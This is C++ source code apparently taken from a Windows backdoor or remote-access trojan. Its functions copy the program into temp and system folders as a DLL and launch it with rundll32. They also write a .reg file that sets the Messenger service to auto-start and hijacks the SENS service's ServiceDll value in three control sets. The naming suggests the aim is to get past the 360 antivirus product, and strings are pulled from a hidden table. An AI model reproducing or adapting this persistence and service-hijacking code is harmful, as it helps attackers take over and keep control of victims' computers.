#include "stdafx.h"

#ifdef PS_VER_DINGZUO
void Make360StartInfo()
{
	//%s.dll
	char m_SprintfStr[256] = {0};
	m_gFunc.GetMyString(10199, m_SprintfStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
	char m_ImagePathSrc[MAX_PATH] = {0};
	if(m_DllInfo.m_DirAddr == 0)
	{
		//%SystemRoot%\\System32最后有个斜杠
		char m_TmpStr[256] = {0};
		m_gFunc.GetMyString(10237, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
		m_gFunc.strcpy(m_ImagePathSrc, m_TmpStr);
		m_gFunc.sprintf(m_ImagePathSrc + m_gFunc.strlen(m_ImagePathSrc), m_SprintfStr, m_DllInfo.m_ServiceName);
	}
	else
	{
		//%ProgramFiles%\\Common Files\\Microsoft Shared最后有个斜杠
		char m_TmpStr[256] = {0};
		m_gFunc.GetMyString(10238, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
		m_gFunc.strcpy(m_ImagePathSrc, m_TmpStr);
		m_gFunc.sprintf(m_ImagePathSrc + m_gFunc.strlen(m_ImagePathSrc), m_SprintfStr, m_DllInfo.m_ServiceName);
	}

	//%sreg.reg
	char m_RegFileSprintfStr[256] = {0};
	m_gFunc.GetMyString(10239, m_RegFileSprintfStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//reg文件
	char m_RegFileName[256] = {0};
	m_gFunc.GetTempPath(200, m_RegFileName);
	m_gFunc.sprintf(m_RegFileName + m_gFunc.strlen(m_RegFileName), m_RegFileSprintfStr, m_DllInfo.m_ServiceName);

	//%sreg.dll
	char m_DllFileSprintfStr[256] = {0};
	m_gFunc.GetMyString(10240, m_DllFileSprintfStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//执行目标文件
	char m_DllFileName[256] = {0};
	m_gFunc.GetTempPath(200, m_DllFileName);
	m_gFunc.sprintf(m_DllFileName + m_gFunc.strlen(m_DllFileName), m_DllFileSprintfStr, m_DllInfo.m_ServiceName);
	
	//生成reg文件
	Make360RegStartTempFile(m_ImagePathSrc, m_RegFileName);

	//拷贝执行文件
	m_DllInfo.m_DllStartCmd = PS_NORMAL_360_MAKE_REG;
	CopyMyFileToDesDir(m_DllFileName);

	//ServiceMain
	char m_ServiceMainStr[256] = {0};
	m_gFunc.GetMyString(10198, m_ServiceMainStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//\"%s\",%s
	m_gFunc.GetMyString(10235, m_SprintfStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//rundll32.exe
	char m_RunDll32Str[256] = {0};
	m_gFunc.GetMyString(10236, m_RunDll32Str, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//启动rundll32.exe启动模块
	TCHAR m_Cmdlines[256] = {0};
	m_gFunc.sprintf(m_Cmdlines, m_SprintfStr, m_DllFileName, m_ServiceMainStr);
	m_gFunc.ShellExecute(NULL, NULL, m_RunDll32Str, m_Cmdlines, NULL, SW_SHOW);
}

void Make360RegStartTempFile(char* pDllPath, char* pFileName)
{
	//打开reg文件
	HANDLE hFile = m_gFunc.CreateFile(pFileName, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return;
	}

	DWORD nWriteLen = 0;

	//\r\n
	char m_ReturnStr[256] = {0};
	m_ReturnStr[0] = (char) 0x0d;
	m_ReturnStr[1] = (char) 0x0a;
	m_ReturnStr[2] = 0x00;

	//Windows Registry Editor Version 5.00
	char m_TmpStr[256] = {0};
	m_gFunc.GetMyString(10225, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
	m_gFunc.strcat(m_TmpStr, m_ReturnStr);
	m_gFunc.WriteFile(hFile, m_TmpStr, m_gFunc.strlen(m_TmpStr), &nWriteLen, NULL);

	//[HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\Messenger]
	char m_MessageStr[256] = {0};
	m_gFunc.GetMyString(10291, m_MessageStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
	m_gFunc.strcat(m_MessageStr, m_ReturnStr);
	
	//\"Start\"=dword:00000002
	char m_StartStr[256] = {0};
	m_gFunc.GetMyString(10292, m_StartStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
	m_gFunc.strcat(m_StartStr, m_ReturnStr);
	
	m_gFunc.WriteFile(hFile, m_MessageStr, m_gFunc.strlen(m_MessageStr), &nWriteLen, NULL);
	m_gFunc.WriteFile(hFile, m_StartStr, m_gFunc.strlen(m_StartStr), &nWriteLen, NULL);
	
	m_MessageStr[39] = '2';
	m_gFunc.WriteFile(hFile, m_MessageStr, m_gFunc.strlen(m_MessageStr), &nWriteLen, NULL);
	m_gFunc.WriteFile(hFile, m_StartStr, m_gFunc.strlen(m_StartStr), &nWriteLen, NULL);

	m_MessageStr[39] = '3';
	m_gFunc.WriteFile(hFile, m_MessageStr, m_gFunc.strlen(m_MessageStr), &nWriteLen, NULL);
	m_gFunc.WriteFile(hFile, m_StartStr, m_gFunc.strlen(m_StartStr), &nWriteLen, NULL);

	//%02x,00,
	char m_ByteX[256] = {0};
	m_gFunc.GetMyString(10228, m_ByteX, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//00,00
	char m_ByteXAndReturn[256] = {0};
	m_gFunc.GetMyString(10229, m_ByteXAndReturn, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
	m_gFunc.strcat(m_ByteXAndReturn, m_ReturnStr);

	//[HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\sens\\Parameters]
	char m_ControlSet[256] = {0};
	m_gFunc.GetMyString(10226, m_ControlSet, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
	m_gFunc.strcat(m_ControlSet, m_ReturnStr);
	m_gFunc.WriteFile(hFile, m_ControlSet, m_gFunc.strlen(m_ControlSet), &nWriteLen, NULL);

	//"ServiceDll"=hex(2):
	char m_ServiceDll[256] = {0};
	m_gFunc.GetMyString(10227, m_ServiceDll, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
	m_gFunc.WriteFile(hFile, m_ServiceDll, m_gFunc.strlen(m_ServiceDll), &nWriteLen, NULL);

	//ControlSet001
	for(DWORD i = 0; i < m_gFunc.strlen(pDllPath); i++)
	{
		char m_AsciiChar[20] = {0};
		m_gFunc.sprintf(m_AsciiChar, m_ByteX, pDllPath[i]);
		m_gFunc.WriteFile(hFile, m_AsciiChar, m_gFunc.strlen(m_AsciiChar), &nWriteLen, NULL);
	}
	m_gFunc.WriteFile(hFile, m_ByteXAndReturn, 7, &nWriteLen, NULL);

	//ControlSet002
	m_ControlSet[39] = '2';
	m_gFunc.WriteFile(hFile, m_ControlSet, m_gFunc.strlen(m_ControlSet), &nWriteLen, NULL);
	m_gFunc.WriteFile(hFile, m_ServiceDll, m_gFunc.strlen(m_ServiceDll), &nWriteLen, NULL);
	for(i = 0; i < m_gFunc.strlen(pDllPath); i++)
	{
		char m_AsciiChar[20] = {0};
		m_gFunc.sprintf(m_AsciiChar, m_ByteX, pDllPath[i]);
		m_gFunc.WriteFile(hFile, m_AsciiChar, m_gFunc.strlen(m_AsciiChar), &nWriteLen, NULL);
	}
	m_gFunc.WriteFile(hFile, m_ByteXAndReturn, 7, &nWriteLen, NULL);
	
	//ControlSet003
	m_ControlSet[39] = '3';
	m_gFunc.WriteFile(hFile, m_ControlSet, m_gFunc.strlen(m_ControlSet), &nWriteLen, NULL);
	m_gFunc.WriteFile(hFile, m_ServiceDll, m_gFunc.strlen(m_ServiceDll), &nWriteLen, NULL);
	for(i = 0; i < m_gFunc.strlen(pDllPath); i++)
	{
		char m_AsciiChar[20] = {0};
		m_gFunc.sprintf(m_AsciiChar, m_ByteX, pDllPath[i]);
		m_gFunc.WriteFile(hFile, m_AsciiChar, m_gFunc.strlen(m_AsciiChar), &nWriteLen, NULL);
	}
	m_gFunc.WriteFile(hFile, m_ByteXAndReturn, 7, &nWriteLen, NULL);
	m_gFunc.CloseHandle(hFile);
}
#endif